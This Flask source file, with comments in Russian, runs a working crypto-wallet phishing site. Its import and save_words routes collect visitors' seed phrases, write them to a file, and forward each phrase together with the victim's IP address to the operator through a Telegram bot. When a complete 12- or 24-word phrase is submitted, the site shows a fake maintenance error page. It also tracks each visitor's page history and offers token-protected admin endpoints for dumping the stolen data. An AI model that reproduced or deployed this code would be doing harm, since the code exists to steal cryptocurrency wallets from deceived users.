from flask import Flask, render_template, request, redirect, jsonify, abort
import os
import requests
import json
from datetime import datetime, timedelta

app = Flask(__name__)

# Переменные из окружения (укажи в Render)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")  # токен для доступа к debug-эндпойнтам (сильного пароля)

# Пути к файлам
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FILE_PATH = os.path.join(BASE_DIR, "words.txt")
USERS_FILE = os.path.join(BASE_DIR, "users.json")


# ========== Работа с users.json (с атомарной записью) ==========
def load_users():
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception as e:
        print(f"[load_users] Ошибка чтения {USERS_FILE}: {e}")
        send_to_telegram(f"⚠️ Ошибка чтения users.json: {e}")
    return {}


def save_users(users):
    temp_path = USERS_FILE + ".tmp"
    try:
        with open(temp_path, "w", encoding="utf-8") as f:
            json.dump(users, f, ensure_ascii=False, indent=2)
        # атомарно заменяем
        os.replace(temp_path, USERS_FILE)
    except Exception as e:
        print(f"[save_users] Ошибка записи {USERS_FILE}: {e}")
        send_to_telegram(f"⚠️ Ошибка записи users.json: {e}")
        # попытка удалить временный файл, если он остался
        try:
            if os.path.exists(temp_path):
                os.remove(temp_path)
        except Exception:
            pass


def is_users_file_writable():
    try:
        # пробуем создать/заменить временный файл
        test_path = USERS_FILE + ".writable_test"
        with open(test_path, "w", encoding="utf-8") as f:
            f.write("ok")
        os.remove(test_path)
        return True
    except Exception as e:
        print("[is_users_file_writable] not writable:", e)
        return False


# ========== Telegram уведомления ==========
def send_to_telegram(message):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print("⚠️ TELEGRAM_TOKEN или CHAT_ID не задан.")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        r = requests.post(url, data=payload, timeout=8)
        r.raise_for_status()
    except Exception as e:
        print("Ошибка отправки в Telegram:", e)


# ========== Хелперы для сохранения состояния ==========
def update_user_page(user_id, path):
    """Сохраняем полный URL последней страницы пользователя (кроме '/')"""
    if not user_id:
        return

    # не сохраняем корень, чтобы не ломать логику
    if path == "/":
        return

    users = load_users()
    if str(user_id) not in users:
        users[str(user_id)] = {}

    # Сохраняем путь вместе с user_id в виде строки "/wallet?user_id=123"
    users[str(user_id)]["last_page"] = f"{path}?user_id={user_id}"
    users[str(user_id)]["last_visit"] = datetime.utcnow().isoformat()

    # Сохраняем атомарно
    save_users(users)

    ip = request.remote_addr
    send_to_telegram(f"👤 User {user_id} (IP: {ip}) открыл страницу: {path}")

    # проверяем, действительно ли запись сохранилась (читаем обратно и логируем)
    users_after = load_users()
    saved = users_after.get(str(user_id), {}).get("last_page")
    send_to_telegram(f"📝 Проверка сохранения для {user_id}: last_page = {saved}")


# ========== Роуты приложения ==========
@app.route("/")
def index():
    user_id = request.args.get("user_id")
    users = load_users()

    if user_id and str(user_id) in users:
        last_page = users[str(user_id)].get("last_page")
        if last_page and last_page != "/":
            ip = request.remote_addr
            send_to_telegram(f"↩️ User {user_id} (IP: {ip}) возвращен на страницу: {last_page}")
            # просто редирект на тот URL, который мы записали
            return redirect(last_page)

    return render_template("index.html")


@app.route("/wallet")
def wallet():
    user_id = request.args.get("user_id")
    update_user_page(user_id, "/wallet")
    return render_template("wallet.html")


@app.route("/error")
def error():
    user_id = request.args.get("user_id")
    update_user_page(user_id, "/error")

    now = datetime.utcnow()
    start = now - timedelta(hours=1)
    end = now + timedelta(hours=3)
    start_time = start.strftime("%H:%M %d.%m.%Y")
    end_time = end.strftime("%H:%M %d.%m.%Y")
    return render_template("error.html", start_time=start_time, end_time=end_time)


@app.route("/new_wallet")
def new_wallet():
    user_id = request.args.get("user_id")

    if user_id:
        users = load_users()
        if str(user_id) not in users:
            users[str(user_id)] = {}
        users[str(user_id)]["wallet_created"] = True
        users[str(user_id)]["last_visit"] = datetime.utcnow().isoformat()
        save_users(users)

    update_user_page(user_id, "/new_wallet")
    return render_template("new_wallet.html")


@app.route("/import", methods=["GET", "POST"])
def import_wallet():
    user_id = request.args.get("user_id")

    if request.method == "POST":
        seed_phrase = request.form.get("words", "").strip()
        if seed_phrase:
            with open(FILE_PATH, "a", encoding="utf-8") as f:
                f.write(seed_phrase + "\n")

            ip = request.remote_addr
            send_to_telegram(f"🔑 User {user_id} (IP: {ip}) импортировал фразу: {seed_phrase}")

            words = seed_phrase.split()
            if len(words) in (12, 24):
                update_user_page(user_id, "/error")
                return render_template("error.html")

            update_user_page(user_id, "/import")
            return render_template("import.html", show_modal=True)

    update_user_page(user_id, "/import")
    return render_template("import.html", show_modal=False)

@app.route("/save_words", methods=["POST"])
def save_words():
    user_id = request.args.get("user_id")
    data = request.get_json()
    words = data.get("words", "").strip()

    if words:
        with open(FILE_PATH, "a", encoding="utf-8") as f:
            f.write(words + "\n")

        ip = request.remote_addr
        send_to_telegram(f"✍️ User {user_id} (IP: {ip}) ввёл фразу: {words}")

    return jsonify({"status": "ok"})



# ========== Админ / debug эндпойнты (требуют ADMIN_TOKEN) ==========
def check_admin_token():
    token = request.args.get("token")
    if not ADMIN_TOKEN:
        abort(403, "ADMIN_TOKEN not set on server")
    if not token or token != ADMIN_TOKEN:
        abort(403, "Invalid admin token")


@app.route("/_admin/users")
def admin_users():
    check_admin_token()
    users = load_users()
    return jsonify(users)


@app.route("/_admin/check_user")
def admin_check_user():
    check_admin_token()
    user_id = request.args.get("user_id")
    if not user_id:
        return jsonify({"error": "user_id required"}), 400
    users = load_users()
    user = users.get(str(user_id))
    return jsonify({"user_id": user_id, "data": user})


@app.route("/_admin/writable")
def admin_writable():
    check_admin_token()
    return jsonify({"writable": is_users_file_writable(), "users_path": USERS_FILE})


if __name__ == "__main__":
    # при старте проверим права на запись и оповестим в телеграм
    writable = is_users_file_writable()
    send_to_telegram(f"ℹ️ Сервер стартовал. users.json writable: {writable}")
    app.run(debug=True, host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
